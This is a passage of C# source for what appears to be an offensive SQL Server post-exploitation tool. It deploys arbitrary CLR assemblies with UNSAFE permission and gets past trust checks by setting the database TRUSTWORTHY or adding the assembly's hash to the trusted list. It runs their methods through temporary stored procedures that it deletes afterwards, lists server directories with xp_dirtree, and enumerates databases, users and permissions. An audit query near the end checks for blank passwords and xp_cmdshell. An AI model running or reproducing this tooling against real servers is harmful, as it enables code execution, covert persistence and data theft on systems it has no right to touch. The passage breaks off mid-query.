                obj.type AS object_type
            FROM sys.assembly_modules mod
            JOIN sys.objects obj ON mod.object_id = obj.object_id
            WHERE mod.assembly_id = (SELECT assembly_id FROM sys.assemblies WHERE name = '{assemblyName}')";
                var dependents = new List<Tuple<string, string>>();
                using (var cmd = new SqlCommand(getDependentsSql, conn))
                using (var rdr = await cmd.ExecuteReaderAsync())
                {
                    while (await rdr.ReadAsync())
                    {
                        dependents.Add(Tuple.Create(
                            rdr.GetString(0),
                            rdr.GetString(1)
                        ));
                    }
                }
                // Drop all dependent objects
                foreach (var dependent in dependents)
                {
                    try
                    {
                        string dropSql = null;
                        string type = dependent.Item2;
                        string name = dependent.Item1;
                        switch (type)
                        {
                            case "P": // SQL_STORED_PROCEDURE
                            case "PC": // CLR_STORED_PROCEDURE
                                dropSql = $"DROP PROCEDURE [{name}]";
                                break;
                            case "FN": // SQL_SCALAR_FUNCTION
                            case "IF": // SQL_INLINE_TABLE_VALUED_FUNCTION
                            case "TF": // SQL_TABLE_VALUED_FUNCTION
                            case "FS": // CLR_SCALAR_FUNCTION
                            case "FT": // CLR_TABLE_VALUED_FUNCTION
                                dropSql = $"DROP FUNCTION [{name}]";
                                break;
                            case "AF": // CLR_AGGREGATE_FUNCTION
                                dropSql = $"DROP AGGREGATE [{name}]";
                                break;
                            case "TA": // CLR_TRIGGER
                            case "TR": // SQL_TRIGGER
                                dropSql = $"DROP TRIGGER [{name}]";
                                break;
                            case "U": // USER_TABLE
                            case "V": // VIEW
                                dropSql = $"DROP VIEW [{name}]";
                                break;
                        }
                        if (dropSql != null)
                        {
                            Console.WriteLine($"[*] Dropping dependent object: {name} ({type})");
                            await ExecuteNonQueryAsync(conn, dropSql);
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[-] Failed to drop dependent object {dependent.Item1}: {ex.Message}");
                    }
                }
                // Now remove the assembly
                string dropAssemblySql = $"DROP ASSEMBLY [{assemblyName}];";
                using (var cmd = new SqlCommand(dropAssemblySql, conn))
                {
                    await cmd.ExecuteNonQueryAsync();
                    Console.WriteLine($"[+] Assembly {assemblyName} removed successfully");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Failed to remove assembly: {ex.Message}");
            }
        }
        #endregion

        static async Task ExecuteNonQueryAsync(SqlConnection conn, string sql)
        {
            using (var cmd = new SqlCommand(sql, conn))
            {
                await cmd.ExecuteNonQueryAsync();
            }
        }
        static async Task<int> ExecuteNonQueryReturnCount(SqlConnection conn, string sql)
        {
            using (var cmd = new SqlCommand(sql, conn))
            {
                return await cmd.ExecuteNonQueryAsync();
            }
        }
        static async Task ExecuteNonQueryIgnoreError(SqlConnection conn, string sql)
        {
            try
            {
                using (var cmd = new SqlCommand(sql, conn))
                {
                    await cmd.ExecuteNonQueryAsync();
                }
            }
            catch { 
            }
        }

        static async Task ExecClrMethod(SqlConnection conn, string assemblyName, string className, string methodName, params string[] parameters)
        {
            try
            {

                assemblyName = assemblyName.Trim('"');
                className = className.Trim('"');
                methodName = methodName.Trim('"');


                string procName = $"clr_proc_{Guid.NewGuid().ToString("N")}";


                string createProcSql = $@"
CREATE PROCEDURE [dbo].[{procName}]
    {BuildParamDeclarations(parameters)}
AS EXTERNAL NAME [{assemblyName}].[{className}].[{methodName}];";

                using (var cmd = new SqlCommand(createProcSql, conn))
                {
                    await cmd.ExecuteNonQueryAsync();
                    Console.WriteLine($"[+] Created temporary stored procedure: {procName}");
                }


                try
                {
                    string execSql = $"EXEC [dbo].[{procName}] {BuildParamList(parameters)}";
                    using (var cmd = new SqlCommand(execSql, conn))
                    {
                        for (int i = 0; i < parameters.Length; i++)
                        {
                            cmd.Parameters.AddWithValue($"@p{i}", parameters[i]);
                        }

                        using (var rdr = await cmd.ExecuteReaderAsync())
                        {
                            while (await rdr.ReadAsync())
                            {
                                for (int i = 0; i < rdr.FieldCount; i++)
                                {
                                    Console.WriteLine(rdr.IsDBNull(i) ? "" : rdr.GetValue(i).ToString());
                                }
                            }
                        }
                    }
                    Console.WriteLine($"[+] CLR execution completed");
                }
                finally
                {

                    try
                    {
                        using (var cmd = new SqlCommand($"DROP PROCEDURE [dbo].[{procName}]", conn))
                        {
                            await cmd.ExecuteNonQueryAsync();
                            Console.WriteLine($"[+] Cleaned up temporary procedure");
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[-] Procedure cleanup error: {ex.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] CLR execution failed: {ex.Message}");
            }
        }
        static string BuildParamDeclarations(string[] parameters)
        {
            if (parameters.Length == 0) return "";
            return string.Join(", ",
                Enumerable.Range(0, parameters.Length)
                .Select(i => $"@p{i} NVARCHAR(MAX)"));
        }
        static string BuildParamList(string[] parameters)
        {
            if (parameters.Length == 0) return "";
            return string.Join(", ",
                Enumerable.Range(0, parameters.Length)
                .Select(i => $"@p{i}"));
        }
        static async Task DeployClrAssembly(SqlConnection conn, string assemblyPath)
        {

            string actualPath = assemblyPath.Trim('"');
            Console.WriteLine($"[*] Deploying CLR assembly from {actualPath}...");
            try
            {

                if (!File.Exists(actualPath))
                {
                    Console.WriteLine($"[-] Assembly file not found: {actualPath}");
                    return;
                }
                byte[] assemblyBytes = File.ReadAllBytes(actualPath);
                string assemblyName = Path.GetFileNameWithoutExtension(actualPath);

                StringBuilder hex = new StringBuilder(assemblyBytes.Length * 2);
                foreach (byte b in assemblyBytes)
                    hex.AppendFormat("{0:x2}", b);
                string assemblyHex = hex.ToString();

                string versionString;
                using (var cmd = new SqlCommand("SELECT SERVERPROPERTY('ProductVersion')", conn))
                {
                    versionString = (await cmd.ExecuteScalarAsync()) as string;
                }
                Version sqlVersion = new Version(versionString);
                int majorVersion = sqlVersion.Major;

                if (majorVersion < 14) 

                {
                    string currentDb = conn.Database;
                    string trustSql = $@"
                IF (SELECT is_trustworthy_on FROM sys.databases WHERE name = '{currentDb}') = 0
                BEGIN
                    ALTER DATABASE [{currentDb}] SET TRUSTWORTHY ON;
                    PRINT '[+] Enabled TRUSTWORTHY for database: {currentDb}';
                END
            ";
                    using (var cmd = new SqlCommand(trustSql, conn))
                    {
                        await cmd.ExecuteNonQueryAsync();
                    }
                }
                else  
                {
                    using (SHA512 sha = SHA512.Create())
                    {
                        byte[] hashBytes = sha.ComputeHash(assemblyBytes);
                        StringBuilder hashHex = new StringBuilder(hashBytes.Length * 2);
                        foreach (byte b in hashBytes)
                            hashHex.AppendFormat("{0:x2}", b);
                        string trustSql = $@"
                    IF NOT EXISTS (
                        SELECT * FROM sys.trusted_assemblies 
                        WHERE hash = 0x{hashHex}
                    )
                    BEGIN
                        EXEC sp_add_trusted_assembly @hash = 0x{hashHex};
                        PRINT '[+] Added assembly hash to trusted assemblies';
                    END
                ";
                        using (var cmd = new SqlCommand(trustSql, conn))
                        {
                            await cmd.ExecuteNonQueryAsync();
                        }
                    }
                }

                string createSql = $@"
            IF EXISTS (SELECT * FROM sys.assemblies WHERE name = '{assemblyName}')
                DROP ASSEMBLY [{assemblyName}];
            CREATE ASSEMBLY [{assemblyName}] 
            FROM 0x{assemblyHex} 
            WITH PERMISSION_SET = UNSAFE;
        ";
                using (var cmd = new SqlCommand(createSql, conn))
                {
                    await cmd.ExecuteNonQueryAsync();
                    Console.WriteLine($"[+] CLR assembly '{assemblyName}' deployed successfully");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Deployment failed: " + ex.Message);
            }
        }

        static async Task SqlDirectoryList(SqlConnection conn, string path = "C:\\")
        {
            try
            {
                path = path.Replace("/", "\\");
                if (!path.EndsWith("\\") && path.Length == 2 && path[1] == ':')
                {
                    path += "\\";
                }
                string sqlPathLiteral = path.Replace("'", "''");

                Console.WriteLine($"[*] Listing: {path}");

                var sql = $@"
BEGIN TRY
    DECLARE @dir TABLE (
        subdir NVARCHAR(4000),
        depth INT,
        isfile INT
    );

    INSERT INTO @dir
    EXEC master.sys.xp_dirtree '{sqlPathLiteral}', 1, 1;

    IF EXISTS (SELECT 1 FROM @dir)
    BEGIN
        SELECT 
            CASE WHEN isfile = 1 THEN 'File' ELSE 'Dir ' END AS Type,
            subdir AS Name
        FROM @dir
        ORDER BY isfile, subdir;
    END
    ELSE
    BEGIN
        SELECT 'Info' AS Type, 'Directory is empty' AS Name;
    END
END TRY
BEGIN CATCH
    DECLARE @errnum INT = ERROR_NUMBER();
    DECLARE @errmsg NVARCHAR(4000) = ERROR_MESSAGE();

    IF @errnum = 5
    BEGIN
        SELECT 'Error' AS Type, 'Access Denied' AS Name;
    END
    ELSE
    BEGIN
        SELECT 'Error' AS Type, 'Directory not found or error: ' + LEFT(@errmsg, 300) AS Name;
    END
END CATCH;
";

                var results = await ExecuteQueryReturnTable(conn, sql);

                if (results != null && results.Count > 0)
                {
                    var firstType = results[0]["Type"]?.ToString();
                    if (firstType == "Error")
                    {
                        Console.WriteLine($"[-] {results[0]["Name"]}: {path}");
                    }
                    else if (firstType == "Info")
                    {
                        Console.WriteLine($"[*] {results[0]["Name"]}: {path}");
                    }
                    else
                    {
                        PrintTable(results);
                    }
                }
                else
                {
                    Console.WriteLine($"[*] Directory is empty or no results returned: {path}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Directory error: {ex.Message}");
            }
        }

        static void ShowBasicInstanceInfo(string server)
        {
            try
            {
                Console.WriteLine("[*] Getting basic instance information");
                var enumerator = SqlDataSourceEnumerator.Instance;
                var instances = enumerator.GetDataSources();


                DataRow match = null;
                foreach (DataRow row in instances.Rows)
                {
                    string serverName = row["ServerName"] as string;
                    string instanceName = row["InstanceName"] as string;

                    if (serverName.Equals(server, StringComparison.OrdinalIgnoreCase) ||
                        $"{serverName}\\{instanceName}".Equals(server, StringComparison.OrdinalIgnoreCase))
                    {
                        match = row;
                        break;
                    }
                }

                if (match == null)
                {
                    Console.WriteLine("[-] Instance not found in domain enumeration");
                    return;
                }

                Console.WriteLine("[+] Basic Server Information");
                Console.WriteLine("------------------------------");
                Console.WriteLine($"|--> Server Name          : {match["ServerName"]}");
                Console.WriteLine($"|--> Instance Name        : {match["InstanceName"] ?? "MSSQLSERVER"}");
                Console.WriteLine($"|--> Version              : {match["Version"] ?? "Unknown"}");
                Console.WriteLine($"|--> Is Clustered         : {match["IsClustered"]}");
                Console.WriteLine($"|--> OS Version           : {Environment.OSVersion.VersionString}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Failed to get instance info: {ex.Message}");
            }
        }

        static async Task ListAssemblies(SqlConnection conn)
        {
            Console.WriteLine("[*] Listing deployed CLR assemblies...");
            string sql = @"
        SELECT 
            a.name, 
            a.permission_set_desc,
            COUNT(m.object_id) AS module_count
        FROM sys.assemblies a
        LEFT JOIN sys.assembly_modules m ON a.assembly_id = m.assembly_id
        WHERE a.is_user_defined = 1
        GROUP BY a.name, a.permission_set_desc";
            try
            {
                using (var cmd = new SqlCommand(sql, conn))
                {
                    using (var reader = await cmd.ExecuteReaderAsync())
                    {
                        if (!reader.HasRows)
                        {
                            Console.WriteLine("[i] No user-defined assemblies found.");
                            return;
                        }
                        Console.WriteLine("Assembly Name          Permission Set      Modules");
                        Console.WriteLine("--------------------------------------------------");
                        while (await reader.ReadAsync())
                        {
                            string name = reader["name"].ToString();
                            string permission = reader["permission_set_desc"].ToString();
                            int modules = Convert.ToInt32(reader["module_count"]);
                            Console.WriteLine($"{name.PadRight(22)} {permission.PadRight(19)} {modules}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Failed to list assemblies: " + ex.Message);
            }
        }
        #endregion
        #region Database enumeration
        static async Task ListDatabases(SqlConnection conn)

        {

            var query = @"

    SELECT 

        name AS [Database],

        state_desc AS [State],

        recovery_model_desc AS [Recovery],

        (SELECT SUM(size)*8/1024 FROM sys.master_files WHERE database_id = d.database_id) AS [Size_MB],

        user_access_desc AS [Access],

        is_read_only AS [RO]

    FROM sys.databases d

    ORDER BY name";



            var table = await ExecuteQueryReturnTable(conn, query);

            PrintTable(table);

        }

        static async Task ListTables(SqlConnection conn, string database = null, string schema = "dbo", bool includeSystem = false)
        {
            int majorVersion = await GetSqlMajorVersion(conn);
            string query;


            bool isSystemDatabase = false;
            if (!string.IsNullOrEmpty(database))
            {
                string dbLower = database.ToLower();
                isSystemDatabase = dbLower == "master" || dbLower == "msdb" ||
                                  dbLower == "model" || dbLower == "tempdb";
            }


            bool forceIncludeSystem = isSystemDatabase && !includeSystem;


            if (majorVersion < 9)
            {

                query = database == null || database.Equals("CURRENT_DB", StringComparison.OrdinalIgnoreCase) ?
                    @"SELECT name AS [Table], 0 AS [RowCount] FROM sysobjects WHERE xtype = 'U' ORDER BY name" :
                    $@"SELECT name AS [Table], 0 AS [RowCount] FROM [{database}].dbo.sysobjects WHERE xtype = 'U' ORDER BY name";
            }

            else if (majorVersion < 11)
            {
                string filter = forceIncludeSystem ? "" : (includeSystem ? "" : "AND t.is_ms_shipped = 0");
                query = database == null || database.Equals("CURRENT_DB", StringComparison.OrdinalIgnoreCase) ?
                    $@"
            SELECT 
                t.name AS [Table],
                p.rows AS [RowCount]
            FROM sys.tables t
            INNER JOIN sys.partitions p ON t.object_id = p.object_id
            WHERE p.index_id IN (0,1) {filter}
            ORDER BY t.name" :
                    $@"
            USE [{database}];
            SELECT 
                t.name AS [Table],
                p.rows AS [RowCount]
            FROM sys.tables t
            INNER JOIN sys.partitions p ON t.object_id = p.object_id
            WHERE p.index_id IN (0,1) {filter}
            ORDER BY t.name";
            }

            else
            {
                string filter = forceIncludeSystem ? "" : (includeSystem ? "" : "AND t.is_ms_shipped = 0");
                query = database == null || database.Equals("CURRENT_DB", StringComparison.OrdinalIgnoreCase) ?
                    $@"
            SELECT 
                t.name AS [Table],
                p.rows AS [RowCount],
                SUM(a.total_pages) * 8 AS [SizeKB]
            FROM sys.tables t
            INNER JOIN sys.partitions p ON t.object_id = p.object_id
            INNER JOIN sys.allocation_units a ON p.partition_id = a.container_id
            WHERE p.index_id IN (0,1) {filter}
            GROUP BY t.name, p.rows
            ORDER BY [RowCount] DESC" :
                    $@"
            USE [{database}];
            SELECT 
                t.name AS [Table],
                p.rows AS [RowCount],
                SUM(a.total_pages) * 8 AS [SizeKB]
            FROM sys.tables t
            INNER JOIN sys.partitions p ON t.object_id = p.object_id
            INNER JOIN sys.allocation_units a ON p.partition_id = a.container_id
            WHERE p.index_id IN (0,1) {filter}
            GROUP BY t.name, p.rows
            ORDER BY [RowCount] DESC";
            }

            var table = await ExecuteQueryReturnTable(conn, query);
            PrintTable(table);
        }
        static async Task ListColumns(SqlConnection conn, string table, string schema = "dbo", string database = null)
        {
            int majorVersion = await GetSqlMajorVersion(conn);


            if (string.IsNullOrEmpty(database))
            {
                database = "CURRENT_DB";
            }

            string query;


            if (majorVersion < 9)
            {
                query = database == "CURRENT_DB" ?
                    $@"
            SELECT 
                c.name AS [Column],
                t.name AS [DataType],
                c.length AS [Length],
                c.isnullable AS [Nullable],
                0 AS [Identity],
                0 AS [Computed]
            FROM syscolumns c
            INNER JOIN systypes t ON c.xtype = t.xtype
            INNER JOIN sysobjects o ON c.id = o.id
            WHERE o.name = '{table.Replace("'", "''")}'
            ORDER BY c.colid" :
                    $@"
            SELECT 
                c.name AS [Column],
                t.name AS [DataType],
                c.length AS [Length],
                c.isnullable AS [Nullable],
                0 AS [Identity],
                0 AS [Computed]
            FROM [{database}].dbo.syscolumns c
            INNER JOIN [{database}].dbo.systypes t ON c.xtype = t.xtype
            INNER JOIN [{database}].dbo.sysobjects o ON c.id = o.id
            WHERE o.name = '{table.Replace("'", "''")}'
            ORDER BY c.colid";
            }

            else if (majorVersion < 11)
            {
                query = database == "CURRENT_DB" ?
                    $@"
            SELECT 
                c.name AS [Column],
                t.name AS [DataType],
                c.max_length AS [Length],
                c.is_nullable AS [Nullable],
                0 AS [Identity],
                0 AS [Computed]
            FROM sys.columns c
            INNER JOIN sys.types t ON c.user_type_id = t.user_type_id
            INNER JOIN sys.tables tbl ON c.object_id = tbl.object_id
            WHERE tbl.name = '{table.Replace("'", "''")}'
            ORDER BY c.column_id" :
                    $@"
            USE [{database}];
            SELECT 
                c.name AS [Column],
                t.name AS [DataType],
                c.max_length AS [Length],
                c.is_nullable AS [Nullable],
                0 AS [Identity],
                0 AS [Computed]
            FROM sys.columns c
            INNER JOIN sys.types t ON c.user_type_id = t.user_type_id
            INNER JOIN sys.tables tbl ON c.object_id = tbl.object_id
            WHERE tbl.name = '{table.Replace("'", "''")}'
            ORDER BY c.column_id";
            }

            else
            {
                query = database == "CURRENT_DB" ?
                    $@"
            SELECT 
                c.name AS [Column],
                t.name AS [DataType],
                c.max_length AS [Length],
                c.is_nullable AS [Nullable],
                COLUMNPROPERTY(c.object_id, c.name, 'IsIdentity') AS [Identity],
                COLUMNPROPERTY(c.object_id, c.name, 'IsComputed') AS [Computed]
            FROM sys.columns c
            INNER JOIN sys.types t ON c.user_type_id = t.user_type_id
            INNER JOIN sys.tables tbl ON c.object_id = tbl.object_id
            INNER JOIN sys.schemas s ON tbl.schema_id = s.schema_id
            WHERE tbl.name = '{table.Replace("'", "''")}'
            ORDER BY c.column_id" :
                    $@"
            USE [{database}];
            SELECT 
                c.name AS [Column],
                t.name AS [DataType],
                c.max_length AS [Length],
                c.is_nullable AS [Nullable],
                COLUMNPROPERTY(c.object_id, c.name, 'IsIdentity') AS [Identity],
                COLUMNPROPERTY(c.object_id, c.name, 'IsComputed') AS [Computed]
            FROM sys.columns c
            INNER JOIN sys.types t ON c.user_type_id = t.user_type_id
            INNER JOIN sys.tables tbl ON c.object_id = tbl.object_id
            INNER JOIN sys.schemas s ON tbl.schema_id = s.schema_id
            WHERE tbl.name = '{table.Replace("'", "''")}'
            ORDER BY c.column_id";
            }

            var columns = await ExecuteQueryReturnTable(conn, query);
            PrintTable(columns);
        }

        static async Task ListUsers(SqlConnection conn)
        {
            int majorVersion = 10; 


            try
            {

                try
                {
                    var version = await ExecuteScalarAsync(conn, "SELECT CAST(SERVERPROPERTY('ProductMajorVersion') AS INT)");
                    if (version != null)
                    {
                        majorVersion = Convert.ToInt32(version);
                    }
                }
                catch
                {
                    try
                    {
                        var versionString = await ExecuteScalarAsync(conn, "SELECT @@VERSION");
                        if (versionString != null)
                        {
                            string v = versionString.ToString();
                            if (v.Contains("2000")) majorVersion = 8;
                            else if (v.Contains("2005")) majorVersion = 9;
                            else if (v.Contains("2008")) majorVersion = 10;
                            else if (v.Contains("2012")) majorVersion = 11;
                            else if (v.Contains("2014")) majorVersion = 12;
                            else if (v.Contains("2016")) majorVersion = 13;
                            else if (v.Contains("2017")) majorVersion = 14;
                            else if (v.Contains("2019")) majorVersion = 15;
                            else if (v.Contains("2022")) majorVersion = 16;
                            else majorVersion = 10; 
                        }
                    }
                    catch
                    {
                        majorVersion = 10; 
                    }
                }

                Console.WriteLine($"[*] Detected SQL Server version: {majorVersion}");

                var results = new List<Dictionary<string, object>>();


                if (majorVersion >= 10)
                {
                    try
                    {
                        var query = @"
                -- Server principals
                SELECT 
                    'SERVER' AS [Scope],
                    name AS [Principal],
                    type_desc AS [Type],
                    ISNULL(CAST(is_disabled AS INT), 0) AS [Disabled]
                FROM sys.server_principals
                WHERE type IN ('S', 'U', 'G') AND name NOT LIKE '##%'
                
                UNION ALL
                
                -- Database users
                SELECT 
                    'DATABASE' AS [Scope],
                    dp.name AS [Principal],
                    dp.type_desc AS [Type],
                    ISNULL(CAST(dp.is_disabled AS INT), 0) AS [Disabled]
                FROM sys.database_principals dp
                WHERE dp.type IN ('S', 'U', 'G') AND dp.name NOT LIKE '##%'
                ORDER BY [Scope], [Principal]";

                        results = await ExecuteQueryReturnTable(conn, query);
                    }
                    catch
                    {

                        Console.WriteLine("[*] Falling back to alternative query for user enumeration");
                    }
                }


                if (results.Count == 0 && majorVersion >= 10)
                {
                    try
                    {
                        var query = @"
                -- Server principals
                SELECT 
                    'SERVER' AS [Scope],
                    name AS [Principal],
                    type_desc AS [Type],
                    0 AS [Disabled]
                FROM sys.server_principals
                WHERE type IN ('S', 'U', 'G') AND name NOT LIKE '##%'
                
                UNION ALL
                
                -- Database users
                SELECT 
                    'DATABASE' AS [Scope],
                    dp.name AS [Principal],
                    dp.type_desc AS [Type],
                    0 AS [Disabled]
                FROM sys.database_principals dp
                WHERE dp.type IN ('S', 'U', 'G') AND dp.name NOT LIKE '##%'
                ORDER BY [Scope], [Principal]";

                        results = await ExecuteQueryReturnTable(conn, query);
                    }
                    catch
                    {

                    }
                }


                if (results.Count == 0 && majorVersion >= 9)
                {
                    try
                    {
                        var query = @"
                -- Server principals
                SELECT 
                    'SERVER' AS [Scope],
                    name AS [Principal],
                    'SQL_LOGIN' AS [Type],
                    0 AS [Disabled]
                FROM master.dbo.syslogins
                
                UNION ALL
                
                -- Database users
                SELECT 
                    'DATABASE' AS [Scope],
                    name AS [Principal],
                    'SQL_USER' AS [Type],
                    0 AS [Disabled]
                FROM dbo.sysusers
                WHERE issqluser = 1 OR isntuser = 1
                ORDER BY [Scope], [Principal]";

                        results = await ExecuteQueryReturnTable(conn, query);
                    }
                    catch
                    {

                    }
                }


                if (results.Count == 0)
                {
                    try
                    {
                        var query = @"
                -- Server principals
                SELECT 
                    'SERVER' AS [Scope],
                    name AS [Principal],
                    'SQL_LOGIN' AS [Type],
                    0 AS [Disabled]
                FROM master.dbo.sysxlogins
                
                UNION ALL
                
                -- Database users
                SELECT 
                    'DATABASE' AS [Scope],
                    name AS [Principal],
                    'SQL_USER' AS [Type],
                    0 AS [Disabled]
                FROM dbo.sysusers
                WHERE issqluser = 1
                ORDER BY [Scope], [Principal]";

                        results = await ExecuteQueryReturnTable(conn, query);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[-] Error retrieving user information: {ex.Message}");
                    }
                }

                if (results.Count > 0)
                {
                    Console.WriteLine("[+] User accounts:");
                    PrintTable(results);
                }
                else
                {
                    Console.WriteLine("[i] No user information could be retrieved");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Critical error in user enumeration: {ex.Message}");
            }
        }

        static async Task ListPermissions(SqlConnection conn)
        {
            int majorVersion = 10; 


            try
            {

                try
                {
                    var version = await ExecuteScalarAsync(conn, "SELECT CAST(SERVERPROPERTY('ProductMajorVersion') AS INT)");
                    if (version != null)
                    {
                        majorVersion = Convert.ToInt32(version);
                    }
                }
                catch
                {
                    try
                    {
                        var versionString = await ExecuteScalarAsync(conn, "SELECT @@VERSION");
                        if (versionString != null)
                        {
                            string v = versionString.ToString();
                            if (v.Contains("2000")) majorVersion = 8;
                            else if (v.Contains("2005")) majorVersion = 9;
                            else if (v.Contains("2008")) majorVersion = 10;
                            else if (v.Contains("2012")) majorVersion = 11;
                            else if (v.Contains("2014")) majorVersion = 12;
                            else if (v.Contains("2016")) majorVersion = 13;
                            else if (v.Contains("2017")) majorVersion = 14;
                            else if (v.Contains("2019")) majorVersion = 15;
                            else if (v.Contains("2022")) majorVersion = 16;
                            else majorVersion = 10; 

                        }
                    }
                    catch
                    {
                        majorVersion = 10; 

                    }
                }

                Console.WriteLine($"[*] Detected SQL Server version: {majorVersion}");

                var results = new List<Dictionary<string, object>>();


                if (majorVersion >= 11)
                {
                    try
                    {
                        var query = @"
                -- Current user permissions
                SELECT 
                    'SERVER' AS [Scope],
                    class_desc AS [ObjectType],
                    permission_name AS [Permission],
                    state_desc AS [State]
                FROM sys.fn_my_permissions(NULL, 'SERVER')
                
                UNION ALL
                
                SELECT 
                    'DATABASE' AS [Scope],
                    class_desc,
                    permission_name,
                    state_desc
                FROM sys.fn_my_permissions(NULL, 'DATABASE')
                
                UNION ALL
                
                -- Role memberships
                SELECT 
                    'ROLE' AS [Scope],
                    'DATABASE_ROLE' AS [ObjectType],
                    dp.name AS [Permission],
                    mp.name AS [State]
                FROM sys.database_role_members drm
                JOIN sys.database_principals dp ON drm.role_principal_id = dp.principal_id
                JOIN sys.database_principals mp ON drm.member_principal_id = mp.principal_id
                WHERE mp.name = USER_NAME()
                
                ORDER BY [Scope], [ObjectType], [Permission]";

                        results = await ExecuteQueryReturnTable(conn, query);
                    }
                    catch
                    {

                    }
                }


                if (results.Count == 0 && majorVersion >= 9)
                {
                    try
                    {
                        var query = @"
                -- Server-level permissions
                SELECT 
                    'SERVER' AS [Scope],
                    p.permission_name AS [Permission],
                    CASE sp.state WHEN 'G' THEN 'GRANT' WHEN 'D' THEN 'DENY' ELSE 'REVOKE' END AS [State]
                FROM sys.server_permissions sp
                INNER JOIN sys.fn_builtin_permissions('SERVER') p ON sp.permission_name = p.permission_name
                WHERE sp.grantee_principal_id = SUSER_ID()
                
                UNION ALL
                
                -- Database-level permissions
                SELECT 
                    'DATABASE' AS [Scope],
                    p.permission_name AS [Permission],
                    CASE dp.state WHEN 'G' THEN 'GRANT' WHEN 'D' THEN 'DENY' ELSE 'REVOKE' END AS [State]
                FROM sys.database_permissions dp
                INNER JOIN sys.fn_builtin_permissions('DATABASE') p ON dp.permission_name = p.permission_name
                WHERE dp.grantee_principal_id = USER_ID()
                
                ORDER BY [Scope], [Permission]";

                        results = await ExecuteQueryReturnTable(conn, query);
                    }
                    catch
                    {

                    }
                }


                if (results.Count == 0)
                {
                    try
                    {
                        var query = @"
                SELECT 'SERVER' AS [Scope], 'sysadmin' AS [Permission], 
                       CASE IS_SRVROLEMEMBER('sysadmin') WHEN 1 THEN 'GRANTED' ELSE 'DENIED' END AS [State]
                UNION ALL
                SELECT 'SERVER', 'securityadmin', 
                       CASE IS_SRVROLEMEMBER('securityadmin') WHEN 1 THEN 'GRANTED' ELSE 'DENIED' END
                UNION ALL
                SELECT 'SERVER', 'serveradmin', 
                       CASE IS_SRVROLEMEMBER('serveradmin') WHEN 1 THEN 'GRANTED' ELSE 'DENIED' END
                UNION ALL
                SELECT 'DATABASE', 'db_owner', 
                       CASE IS_MEMBER('db_owner') WHEN 1 THEN 'GRANTED' ELSE 'DENIED' END";

                        results = await ExecuteQueryReturnTable(conn, query);
                    }
                    catch
                    {
                        Console.WriteLine("[-] Error retrieving permission information");
                    }
                }

                if (results.Count > 0)
                {
                    Console.WriteLine("[+] User permissions:");
                    PrintTable(results);
                }
                else
                {
                    Console.WriteLine("[i] No permission information could be retrieved");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Critical error in permission enumeration: {ex.Message}");
            }
        }


        static async Task<int> GetSqlMajorVersion(SqlConnection conn)
        {
            try
            {
                string versionQuery = "SELECT CAST(SERVERPROPERTY('ProductMajorVersion') AS INT)";
                var versionResult = await ExecuteScalarAsync(conn, versionQuery);

                if (versionResult != null && int.TryParse(versionResult.ToString(), out int majorVersion))
                {
                    return majorVersion;
                }
            }
            catch
            {

                try
                {
                    string versionStringQuery = "SELECT @@VERSION";
                    var versionStringResult = await ExecuteScalarAsync(conn, versionStringQuery);

                    if (versionStringResult != null)
                    {
                        string versionString = versionStringResult.ToString();


                        if (versionString.Contains("2000"))
                            return 8;
                        else if (versionString.Contains("2005"))
                            return 9;
                        else if (versionString.Contains("2008"))
                            return 10;
                        else if (versionString.Contains("2012"))
                            return 11;
                        else if (versionString.Contains("2014"))
                            return 12;
                        else if (versionString.Contains("2016"))
                            return 13;
                        else if (versionString.Contains("2017"))
                            return 14;
                        else if (versionString.Contains("2019"))
                            return 15;
                        else if (versionString.Contains("2022"))
                            return 16;
                    }
                }
                catch
                {

                    return 10;
                }
            }


            return 10;
        }
        static async Task SecurityAudit(SqlConnection conn)

        {

            var query = @"

    SELECT 

        'Default sa account' AS [Check], 

        CASE WHEN EXISTS (SELECT 1 FROM sys.sql_logins WHERE name = 'sa' AND is_disabled = 0) 

             THEN 'VULNERABLE - sa account enabled' ELSE 'OK' END AS [Status],

        3 AS [Severity]

    UNION ALL

    SELECT 

        'Blank passwords', 

        CASE WHEN EXISTS (SELECT 1 FROM sys.sql_logins WHERE PWDCOMPARE('', password_hash) = 1) 

             THEN 'VULNERABLE - blank passwords found' ELSE 'OK' END,

        3

    UNION ALL

    SELECT 

        'Multiple sysadmins', 

        CASE WHEN (SELECT COUNT(*) FROM sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1) > 1 

             THEN 'WARNING - multiple sysadmins' ELSE 'OK' END,

        2

    UNION ALL

    SELECT 

        'Ad-hoc queries', 

        CASE WHEN (SELECT value_in_use FROM sys.configurations WHERE name = 'Ad Hoc Distributed Queries') = 1 

             THEN 'WARNING - Ad Hoc Distributed Queries enabled' ELSE 'OK' END,

        2

    UNION ALL

    SELECT 

        'xp_cmdshell', 

        CASE WHEN (SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell') = 1 

             THEN 'WARNING - xp_cmdshell enabled' ELSE 'OK' END,

        2

    UNION ALL

    SELECT 

        'Ole Automation', 

        CASE WHEN (SELECT value_in_use FROM sys.configurations WHERE name = 'Ole Automation Procedures') = 1 

             THEN 'WARNING - Ole Automation enabled' ELSE 'OK' END,

        2

    UNION ALL

    SELECT 

        'CLR enabled', 

        CASE WHEN (SELECT value_in_use FROM sys.configurations WHERE name = 'clr enabled') = 1 

             THEN 'INFO - CLR enabled' ELSE 'OK' END,

        1

    UNION ALL

    SELECT 

        'CLR strict security', 

        CASE WHEN (SELECT value_in_use FROM sys.configurations WHERE name = 'clr strict security') = 1 

             THEN 'INFO - CLR strict security enabled' ELSE 'WARNING - CLR strict security disabled' END,

        CASE WHEN (SELECT value_in_use FROM sys.configurations WHERE name = 'clr strict security') = 1 THEN 1 ELSE 2 END

    UNION ALL

    SELECT 

        'Database ownership chaining', 

        CASE WHEN (SELECT value_in_use FROM sys.configurations WHERE name = 'cross db ownership chaining') = 1 

